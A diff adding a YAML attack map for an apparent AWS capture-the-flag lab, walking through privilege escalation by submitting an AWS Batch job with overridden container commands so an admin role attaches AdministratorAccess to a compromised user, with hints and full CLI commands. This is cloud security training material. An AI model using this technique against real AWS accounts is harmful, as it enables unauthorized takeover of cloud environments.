@@ -1,0 +1,141 @@
+attackMap:
+  nodes:
+    - id: starting-user
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-batch-002-to-admin-starting-user"
+      access:
+        type: assumed-breach-credentials
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has batch:SubmitJob permission on all job definitions — and
+        critically, does NOT need iam:PassRole. A pre-existing Batch job definition in
+        the account already has an admin role bound as its jobRoleArn. Submitting to
+        that definition with a ContainerOverrides.Command replacement is enough to
+        execute arbitrary AWS CLI calls as the admin role.
+
+    - id: batch-job-def
+      label: "Admin Job Definition"
+      type: resource
+      subType: batch-job
+      arn: "arn:aws:batch:{region}:{account_id}:job-definition/pl-prod-batch-002-to-admin-job-def"
+      description: >
+        A pre-existing AWS Batch job definition with the admin role set as its
+        jobRoleArn. The attacker does not register or modify this definition — it
+        already exists. By submitting a job against this definition with
+        ContainerOverrides.Command, the attacker replaces the benign default command
+        with an arbitrary AWS CLI call. The container runs as the admin role via the
+        ECS container credential provider, executing whatever command the attacker
+        injected.
+
+    - id: admin-role
+      label: "Admin Role"
+      type: principal
+      subType: iam-role
+      isAdmin: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-batch-002-to-admin-admin-role"
+      description: >
+        This IAM role has AdministratorAccess and trusts ecs-tasks.amazonaws.com.
+        It is bound as the jobRoleArn in the pre-existing Batch job definition.
+        When the Batch job container starts, ECS automatically injects this role's
+        temporary credentials via the container credential provider endpoint
+        (169.254.170.2). The injected command runs as this role and attaches
+        AdministratorAccess to the starting user, completing the privilege escalation
+        without the attacker ever holding iam:PassRole.
+
+    - id: ctf-flag
+      label: "CTF Flag"
+      type: resource
+      subType: ssm-parameter
+      isTarget: true
+      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/batch-002-to-admin"
+      description: >
+        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
+        Retrieving it requires administrator-equivalent permissions — ssm:GetParameter is
+        granted implicitly by AdministratorAccess. After the Batch job attaches
+        AdministratorAccess to the starting user, those same starting-user credentials
+        can read this parameter directly. The flag value is deployment-specific and
+        proves end-to-end exploitation.
+
+  edges:
+    - from: starting-user
+      to: batch-job-def
+      label: "batch:SubmitJob + ContainerOverrides.Command"
+      description: >
+        The starting user submits a job to the pre-existing admin-role job definition,
+        replacing the container command via ContainerOverrides.Command with an
+        iam:AttachUserPolicy call targeting the starting user. No iam:PassRole is
+        required because the job definition already exists — the role was passed when
+        the definition was originally registered. The Batch service schedules a Fargate
+        task that inherits the admin jobRoleArn and runs the injected command.
+      hints:
+        - "The batch:SubmitJob API accepts a containerOverrides parameter that lets you replace the container command at submit time — no need to register a new job definition or hold iam:PassRole."
+        - "Build a ContainerOverrides JSON with a command array that calls iam:AttachUserPolicy on the starting user with the AdministratorAccess policy ARN. Submit to the existing job definition and poll batch:DescribeJobs until status reaches SUCCEEDED — Fargate provisioning typically takes 1-3 minutes."
+        - "Browse to https://pathfinding.cloud/paths/batch-002 for full technique details."
+      commands:
+        - description: "Check your current identity"
+          command: "aws sts get-caller-identity"
+        - description: "Discover existing job definitions with privileged jobRoleArn"
+          command: "aws batch describe-job-definitions --status ACTIVE --query 'jobDefinitions[*].[jobDefinitionName,jobDefinitionArn,containerProperties.jobRoleArn]' --output table"
+        - description: "List available job queues"
+          command: "aws batch describe-job-queues --query 'jobQueues[*].[jobQueueName,state,status]' --output table"
+        - description: "Build ContainerOverrides payload overriding the job command"
+          command: >
+            echo '{
+              "command": [
+                "iam", "attach-user-policy",
+                "--user-name", "pl-prod-batch-002-to-admin-starting-user",
+                "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"
+              ],
+              "environment": [{"name": "AWS_DEFAULT_REGION", "value": "{region}"}]
+            }' > /tmp/overrides.json
+        - description: "Submit the job with the overridden command"
+          command: >
+            aws batch submit-job
+            --job-name pl-batch-002-privesc-job
+            --job-definition pl-prod-batch-002-to-admin-job-def
+            --job-queue pl-prod-batch-002-to-admin-queue
+            --container-overrides file:///tmp/overrides.json
+        - description: "Poll job status until SUCCEEDED"
+          command: "aws batch describe-jobs --jobs <job-id> --query 'jobs[0].status' --output text"
+
+    - from: batch-job-def
+      to: admin-role
+      label: "Container executes as admin role via ECS task credentials"
+      description: >
+        The Batch job container receives the admin role's credentials automatically
+        through the ECS container credential provider (169.254.170.2). The injected
+        iam:AttachUserPolicy command runs as the admin role, attaching AdministratorAccess
+        to the starting user. After the job reaches SUCCEEDED status, wait 30 seconds
+        for IAM policy propagation before attempting to use the elevated permissions.
+      hints: []
+      commands:
+        - description: "Verify AdministratorAccess was attached to the starting user"
+          command: "aws iam list-attached-user-policies --user-name pl-prod-batch-002-to-admin-starting-user"
+        - description: "Wait for IAM policy propagation"
+          command: "sleep 30"
+        - description: "Verify admin access with the starting user credentials"
+          command: "aws iam list-users --max-items 3 --output table"
+
+    - from: admin-role
+      to: ctf-flag
+      label: "Read CTF flag"
+      description: >
+        With AdministratorAccess now attached to the starting user by the Batch job
+        container, retrieve the scenario flag from SSM Parameter Store using the same
+        starting-user credentials. AdministratorAccess grants ssm:GetParameter on all
+        parameters in the account, so no additional steps are needed.
+      hints:
+        - "You now hold admin-equivalent credentials on the starting user. The scenario flag is stored in an AWS service commonly used to hold configuration values and small secrets."
+        - "Scenario flags live under a shared prefix in SSM Parameter Store — consider what a reasonable naming convention for this lab might look like."
+        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
+      commands:
+        - description: "Retrieve the CTF flag from SSM Parameter Store"
+          command: "aws ssm get-parameter --name /pathfinding-labs/flags/batch-002-to-admin --query 'Parameter.Value' --output text"
